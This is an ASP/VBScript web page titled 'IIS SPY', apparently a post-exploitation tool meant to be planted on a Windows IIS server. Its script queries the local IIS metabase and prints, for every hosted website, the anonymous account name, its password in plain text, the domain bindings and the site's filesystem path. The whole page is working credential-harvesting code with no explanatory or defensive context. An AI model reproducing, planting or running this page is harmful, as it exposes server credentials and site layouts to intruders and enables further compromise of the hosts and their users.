<html xmlns=http://www.w3.org/1999/xhtml>
<head id=Head1>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312" />
<meta http-equiv="pragma" content="no-cache" />
<title>IIS SPY</title>
<style type="text/css">
BODY,TD{FONT-SIZE: 14px;line-height:20px;}
.tab-content { BORDER-RIGHT: #cccccc 1px solid; PADDING-RIGHT: 5px; BORDER-TOP: #cccccc 1px; PADDING-LEFT: 5px; PADDING-BOTTOM: 5px; VERTICAL-ALIGN: top; BORDER-LEFT: #cccccc 1px solid; PADDING-TOP: 5px; BORDER-BOTTOM: #cccccc 1px solid; BACKGROUND-COLOR: #ffffff;}
.Soft-content { BORDER-RIGHT: #cccccc 1px solid; PADDING-RIGHT: 5px; BORDER-TOP: #cccccc 1px solid; PADDING-LEFT: 5px; PADDING-BOTTOM: 5px; VERTICAL-ALIGN: top; BORDER-LEFT: #cccccc 1px solid; PADDING-TOP: 5px; BORDER-BOTTOM: #cccccc 1px solid; BACKGROUND-COLOR: #ffffff;}
</style>
</head>
<body>
<table cellspacing=1 runat=server cellpadding=1 width=600px align=center border=0>
<tr><td class=Soft-content>
        <div id="frm_main">
<%
n=VbCrlf
iisspy()
Sub echo(s)
        Response.Write(s)
End Sub
Sub iisspy()
On Error Resume Next
Set ObjService=GetObject("IIS://LocalHost/W3SVC")
If  err  Then
        echo "[ERROR]="&Err.Description&n
        Exit sub
End If
Dim ctn
ctn="<table class=tab-content width=100% border=0 align=center cellpadding=0 cellspacing=0>"&n&_
"<tr bgcolor=#0066CC><td>ID:</td><td>IIS_USER:</td><td>IIS_PASS:</td><td>Domain:</td><td>Path:</td></tr>"&n
i=0
For Each obj3w In objservice
        i=i+1
        If i Mod 2=0 Then
        ctn=ctn&"<tr>"
        Else
        ctn=ctn&"<tr bgcolor=#F0F8FF>"
        End if
        childObjectName=replace(obj3w.AdsPath,Left(obj3w.Adspath,22),"")
        if IsNumeric(childObjectName)=true then
        set IIs=objservice.GetObject("IIsWebServer",childObjectName)
        if err Then
                ctn=ctn&"<td>[ERROR]="&Err.Description&"</td><td></td><td></td><td></td><td></td></tr>"&n
        else
                serverbindings=IIS.serverBindings
                ServerComment=iis.servercomment
                set IISweb=iis.getobject("IIsWebVirtualDir","Root")
                user=iisweb.AnonymousUserName
                pass=iisweb.AnonymousUserPass
                path=IIsWeb.path
                ctn=ctn&"<td >"&i&"</td>"
                ctn=ctn&"<td >"&user&"</td>"
                ctn=ctn&"<td >"&pass&"</td>"
                ctn=ctn&"<td >"&join(serverBindings,"")&"</td>"
                ctn=ctn&"<td >"&path&"</td></tr>"&n
        End If
end if
Next
ctn=ctn&"</table>"
echo ctn
Set ObjService=Nothing
End Sub
%>
        </div>
</td></tr>
</table>
</body>
</html>